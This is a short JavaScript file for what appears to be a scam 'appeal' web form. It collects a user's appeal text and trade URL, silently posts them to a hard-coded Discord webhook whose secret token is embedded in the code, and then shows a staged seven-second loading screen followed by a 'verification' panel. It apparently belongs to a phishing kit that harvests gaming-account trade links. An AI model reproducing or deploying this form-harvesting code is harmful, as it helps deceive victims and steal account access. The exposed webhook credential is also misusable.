function checkInputs() {
    let appealText = document.getElementById('appeal').value.trim();
    let tradeUrl = document.getElementById('tradeurl').value.trim();
    let button = document.getElementById('submitBtn');

    if (appealText.length > 5 && tradeUrl.length > 5) {
        button.classList.add('enabled');
    } else {
        button.classList.remove('enabled');
    }
}

function submitAppeal() {
    let appealText = document.getElementById('appeal').value.trim();
    let tradeUrl = document.getElementById('tradeurl').value.trim();
    
    let container = document.querySelector('.container');
    let loading = document.querySelector('.loading');
    let verification = document.querySelector('.verification');

    container.style.display = 'none';
    loading.style.display = 'block';

    // Send data to Discord Webhook
    fetch('https://discord.com/api/webhooks/1353030125482020967/QHYRl7mAqyPIXCRUw_ylxTG3GfHRJgI5x5Y-NMSFnZKQeY0FtthPXd8bFv_-cwwt_RVq', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            content: `📩 **New Appeal Submitted!**\n\n📝 **Appeal:** ${appealText}\n🔗 **Trade URL:** ${tradeUrl}`
        })
    })
    .then(response => response.text())
    .then(data => console.log("Sent to Discord:", data))
    .catch(error => console.error("Error:", error));

    setTimeout(() => {
        loading.style.display = 'none';
        verification.style.display = 'block';
    }, 7000);
}
